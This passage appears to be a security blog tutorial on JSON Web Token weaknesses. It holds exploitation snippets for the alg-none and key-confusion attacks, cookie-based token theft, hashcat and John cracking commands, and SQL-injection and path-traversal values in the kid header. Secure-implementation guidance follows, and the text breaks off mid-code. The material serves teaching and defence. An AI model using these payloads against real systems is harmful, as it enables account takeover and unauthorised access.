---
layout: post
title: JSON Web Token (JWT) Security
date: 2025-04-10 16:45 +0300
categories: [Web Security, Client-Side Attacks]
tags: [token, cookie, jwt]
---

## Introduction to JWTs

JSON Web Tokens (JWTs) are a compact, URL-safe means of representing claims between two parties. They are commonly used for authentication and authorization in web applications and APIs. While JWTs offer many advantages, they also introduce specific security concerns that must be addressed.

## JWT Structure

A JWT consists of three parts separated by dots (`.`):

1. **Header** - Contains metadata about the token type and signing algorithm
2. **Payload** - Contains claims (statements about an entity)
3. **Signature** - Verifies the token hasn't been altered

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
      |                                   |                                                      |
   Header (Base64Url encoded)    Payload (Base64Url encoded)                              Signature
```

### Header Example
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload Example
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622,
  "role": "user"
}
```

## Common JWT Security Vulnerabilities

### 1. Algorithm None Attack

The "none" algorithm allows tokens to have no signature, completely bypassing verification.

```javascript
// Original header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Modified to use "none" algorithm
{
  "alg": "none",
  "typ": "JWT"
}
```

**Exploitation:**
```javascript
const header = {
  "alg": "none",
  "typ": "JWT"
};
const payload = {
  "sub": "1234567890",
  "name": "John Doe",
  "role": "admin"  // Escalated privileges
};
const modifiedToken = base64UrlEncode(JSON.stringify(header)) + '.' + 
                     base64UrlEncode(JSON.stringify(payload)) + '.';
```

### 2. Algorithm Switching Attack (Key Confusion)

Switching from asymmetric (RS256) to symmetric (HS256) algorithms can lead to signature bypass.

```javascript
// Original header (RS256 - asymmetric)
{
  "alg": "RS256",
  "typ": "JWT"
}

// Modified to use HS256 (symmetric)
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Exploitation:**
```javascript
// If the server uses the public key to verify HS256 signatures
// when it should only use it for RS256 verification
const publicKey = fetchPublicKey(); // From certificate, JWKs, etc.

// Modify token to use HS256 with public key as the secret
const token = createHS256Token(payload, publicKey);
```

### 3. Token Sidejacking (Missing Proper Binding)

JWTs can be stolen and reused if not properly bound to the client.

**Exploitation:**
```javascript
// Attacker steals JWT from victim via XSS, Man-in-the-Middle, etc.
const stolenToken = document.cookie.match(/jwt=([^;]+)/)[1];

// Attacker uses token in their own requests
fetch('https://api.example.com/sensitive-data', {
  headers: {
    'Authorization': `Bearer ${stolenToken}`
  }
});
```

### 4. Weak Secret Keys

JWTs signed with weak secret keys can be cracked through brute force or dictionary attacks.

**Exploitation:**
```bash
# Using hashcat to crack a JWT
hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" wordlist.txt

# Using john the ripper
john jwt.txt --format=HMAC-SHA256 --wordlist=wordlist.txt
```

### 5. Missing Expiration Validation

JWTs without expiration times or with improperly validated expiration remain valid indefinitely.

```json
// JWT payload without expiration
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
  // Missing "exp" claim
}
```

**Exploitation:**
```javascript
// Token captured once will work indefinitely if exp is missing
const stolenToken = "eyJhbGciOi..."; // Token without expiration

// Can be used months or years later if not invalidated
fetch('https://api.example.com/data', {
  headers: { 'Authorization': `Bearer ${stolenToken}` }
});
```

### 6. JWT Signature Stripping

Some implementations may only validate the structure but not the signature.

**Exploitation:**
```javascript
// Original JWT
const original = "header.payload.signature";

// Remove or modify signature
const modified = "header.payload.";  // Removed signature
// OR
const modified = "header.payload.invalid_signature";  // Invalid signature
```

### 7. Information Disclosure

Storing sensitive information in non-encrypted JWTs exposes data.

```json
// Sensitive information in payload
{
  "sub": "1234567890",
  "name": "John Doe",
  "email": "john@example.com",
  "ssn": "123-45-6789",  // Should not be here
  "credit_card": "4111111111111111"  // Should not be here
}
```

### 8. Cross-Service Replay Attacks

JWTs may be accepted across different services if issuer validation is missing.

**Exploitation:**
```javascript
// Token issued by service A
const tokenFromServiceA = "eyJhbGciOi...";

// Used against service B that doesn't validate the "iss" (issuer) claim
fetch('https://serviceB.example.com/api', {
  headers: { 'Authorization': `Bearer ${tokenFromServiceA}` }
});
```

### 9. Missing JWT Invalidation

Many systems lack the ability to invalidate a specific JWT before its expiration.

**Exploitation:**
```javascript
// User logs out but token remains valid
const tokenBeforeLogout = "eyJhbGciOi...";

// Can still be used after logout if not properly invalidated
fetch('https://api.example.com/data', {
  headers: { 'Authorization': `Bearer ${tokenBeforeLogout}` }
});
```

## Advanced JWT Exploits

### JWT Header Parameter Injection

Injection of additional header parameters to manipulate validation.

```javascript
// Original header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Injected header with kid (Key ID) parameter 
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../dev/null" // Path traversal attack on systems that use kid to locate key file
}
```

### JWT Kid (Key ID) Attacks

Many systems use the `kid` parameter to select the key for validation.

**Exploitation:**
```javascript
// SQL Injection via kid parameter
const header = {
  "alg": "HS256",
  "kid": "' UNION SELECT 'attacker_controlled_secret' -- "
};

// Path traversal via kid parameter
const header = {
  "alg": "HS256",
  "kid": "../../../etc/passwd"  // Server reads this file as the key
};
```

### JWT Signature Verification Bypass with JWK

```javascript
// Original header using jwk
{
  "alg": "HS256",
  "jwk": {
    "kty": "oct",
    "k": "AyM1SysPpbyDfgZld3umj1qzKObwVMkoqQ-EstJQLr_T-1qS0gZH75aKtMN3Yj0iPS4hcgUuTwjAzZr1Z9CAow"
  }
}

// Attacker provides their own key
{
  "alg": "HS256",
  "jwk": {
    "kty": "oct",
    "k": "GawgguFyGrWKav7AX4VKUg"  // Attacker-controlled key
  }
}
```

### JWT Claim Injection

```json
// Original payload
{
  "sub": "1234567890",
  "role": "user"
}

// Modified with additional claims
{
  "sub": "1234567890",
  "role": "user",
  "admin": true,
  "permissions": ["read", "write", "delete", "admin"]
}
```

## Secure JWT Implementation Guidelines

### 1. Proper Algorithm Selection and Enforcement

```javascript
// Node.js example with explicit algorithm enforcement
const jwt = require('jsonwebtoken');

// When signing
const token = jwt.sign(payload, privateKey, { 
  algorithm: 'RS256'  // Explicitly specify algorithm
});

// When verifying
try {
  const decoded = jwt.verify(token, publicKey, { 
    algorithms: ['RS256']  // Only accept RS256
  });
} catch (err) {
  // Handle invalid token
}
```

### 2. Strong Key Management

```javascript
// Generate strong keys
const crypto = require('crypto');

// For HMAC algorithms (HS256, HS384, HS512)
const secretKey = crypto.randomBytes(64).toString('hex');

// For RSA (RS256, RS384, RS512) - using OpenSSL
// openssl genrsa -out private.pem 2048
// openssl rsa -in private.pem -pubout -out public.pem
```

### 3. Proper Claim Validation

```javascript
// Node.js example with full claim validation
const jwt = require('jsonwebtoken');

try {
  const decoded = jwt.verify(token, publicKey, {
    algorithms: ['RS256'],
    issuer: 'https://myissuer.example.com',
    audience: 'https://myapi.example.com',
    maxAge: '1h',  // Verify exp is not too far in the future
    subject: expectedSubject  // If known
  });
  
  // Additional custom validations
  if (!decoded.permissions || !decoded.permissions.includes('required-permission')) {
    throw new Error('Missing required permission');
  }
} catch (err) {
  // Handle validation errors
}
```

### 4. Set Appropriate Expiration Times

```javascript
// Short-lived tokens (15-30 minutes)
const token = jwt.sign(payload, privateKey, {
  algorithm: 'RS256',
  expiresIn: '15m'  // 15 minutes
});

// With refresh token pattern for longer sessions
const refreshToken = crypto.randomBytes(64).toString('hex');
// Store refreshToken securely in database with user association
```

### 5. Include Essential Claims

```javascript
const payload = {
  sub: userId,                           // Subject (user identifier)
  iss: 'https://myissuer.example.com',   // Issuer
  aud: 'https://myapi.example.com',      // Audience
  iat: Math.floor(Date.now() / 1000),
